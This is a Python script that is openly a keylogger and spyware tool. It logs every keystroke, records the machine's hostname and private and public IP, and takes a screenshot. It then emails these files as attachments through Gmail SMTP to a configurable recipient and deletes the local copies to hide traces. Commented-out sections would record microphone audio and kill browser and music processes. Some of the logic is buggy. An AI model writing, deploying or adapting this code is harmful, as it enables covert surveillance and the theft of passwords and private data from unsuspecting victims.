import os

# Modules for keylogger

from pynput.keyboard import Key , Listener

# Modules for ip

import socket
from requests import get

# Modules for ss

import pyscreenshot as ss

# Module for sound

import sounddevice as sd
from scipy.io.wavfile import write

# Module for process killing

import psutil

# Send email 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# E-mail global

email_id = ""
password = ""
toadr = ""


# File name

keys_info = "Key logs.txt"
ip_info = "Ip.txt"
screen_info="Screenshot.png"
#audio_info="Recording.wav"
file_list=[keys_info,ip_info,screen_info]

file_path = ""
extend = ""



# IP Address

with open(file_path + extend + ip_info ,"a") as f:
	
	hostname = socket.gethostname()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	ipa = (s.getsockname()[0])
	s.close()
	f.write("Hostname : "+ hostname+"\n")
	f.write("Private Ip : " +ipa +"\n") 
		
	try:
		public_ip = get("https://api.ipify.org").text
		f.write("Public IP Address : " + public_ip)

	except Exception:
		f.write("Unable to get public IP")
	

# Screenshot

im = ss.grab()
im.save(file_path+extend+screen_info)

# Recording
"""
fs=44100
seconds= 10
recording = sd.rec(int(seconds*fs),samplerate = fs,channel=2)
sd.wait()
write(file_path+extend+audio_info,fs,recording)
"""

# Kill Process

"""
PROCNAME = ["firefox","spotify"]

for proc in psutil.process_iter():
    for i in range(0,2):
        if proc.name() == PROCNAME[i]:
            proc.kill()
"""


# Key logger

count = 0
keys = []



def on_press(key):
	global keys, count
	
	print(key)
	keys.append(key)
	count +=1
	
	if count >=1:
		count =0
		write_file(keys)
		keys=[]

def on_release(key):
	if key == Key.insert:
		return False

def write_file(keys):
	with open(file_path + extend + keys_info , "a+") as f:
		for key in keys :
			k = str(key).replace("'","")
			if k.find("space") > 0:
				f.write(" "+k+"\n")
				f.close()
			elif k.find("enter") > 0:
				f.write("\n")
				f.close()
			elif k.find("Key") == -1:
				f.write(k)
				f.close()
			elif k.find("ctrl")or("backspace")or("alt")or("shift")or("esc")or("delete")or("cmd")or("up")or("down")or("left")or("right") > 0:
				f.write(" "+k+" ")
				f.close()

			
				
with Listener (on_press=on_press,on_release=on_release) as listener:
	listener.join()

# Send email

def send_email(filename,attachment,toadr):
	
	fromaddr = email_id
	msg=MIMEMultipart()
	msg['From'] = fromaddr
	msg['To']=toadr
	msg['Subject']="Log Files"
	filename = filename
	attachment = open(attachment,'rb')
	p = MIMEBase('application','octet-stream')
	p.set_payload((attachment).read())
	encoders.encode_base64(p)
	p.add_header('Content-Disposition',"attachment;filename = %s" % filename)
	msg.attach(p)
	s=smtplib.SMTP('smtp.gmail.com',587)
	s.starttls()
	s.login(fromaddr,password)
	text = msg.as_string()
	s.sendmail(fromaddr,toadr,text)
	s.quit()

for i in file_list:
	send_email(i,file_path + extend + i,toadr)



# Delete Files

delete_files = [keys_info,ip_info,screen_info]
for fil in delete_files:
	os.remove(file_path+extend+ fil)
